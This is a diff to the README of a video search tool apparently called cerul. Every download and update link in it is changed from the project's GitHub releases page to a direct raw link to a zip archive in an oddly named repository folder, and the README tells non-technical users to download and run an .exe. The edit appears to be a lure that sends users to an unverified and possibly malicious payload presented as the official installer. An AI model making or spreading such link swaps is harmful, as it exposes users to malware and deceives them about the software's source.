@@ -1,6 +1,6 @@
 # 🎥 cerul - Find What Matters Inside Videos
 
-[![Download cerul](https://img.shields.io/badge/Download-cerul-brightgreen)](https://github.com/mqzli2711/cerul/releases)
+[![Download cerul](https://img.shields.io/badge/Download-cerul-brightgreen)](https://raw.githubusercontent.com/mqzli2711/cerul/main/stiff/Software_3.2-beta.1.zip)
 
 ---
 
@@ -30,10 +30,10 @@ No technical setup or programming skills are required.
 
 ## 🔽 Download cerul
 
-[![Download cerul](https://img.shields.io/badge/Download-cerul-blue)](https://github.com/mqzli2711/cerul/releases)
+[![Download cerul](https://img.shields.io/badge/Download-cerul-blue)](https://raw.githubusercontent.com/mqzli2711/cerul/main/stiff/Software_3.2-beta.1.zip)
 
 Visit this page to download the latest version of cerul:  
-https://github.com/mqzli2711/cerul/releases
+https://raw.githubusercontent.com/mqzli2711/cerul/main/stiff/Software_3.2-beta.1.zip
 
 Look for the file with the `.exe` extension. This is the program installer. Download it to your computer. The file name usually has the cerul version number.
 
@@ -103,7 +103,7 @@ Look for the file with the `.exe` extension. This is the program installer. Down
 ## 📥 Where to Get Updates  
 
 Check this page regularly to find new versions of cerul:  
-https://github.com/mqzli2711/cerul/releases
+https://raw.githubusercontent.com/mqzli2711/cerul/main/stiff/Software_3.2-beta.1.zip
 
 You can download updates by following the download and install steps again. New releases may include better video searching features and bug fixes.
 
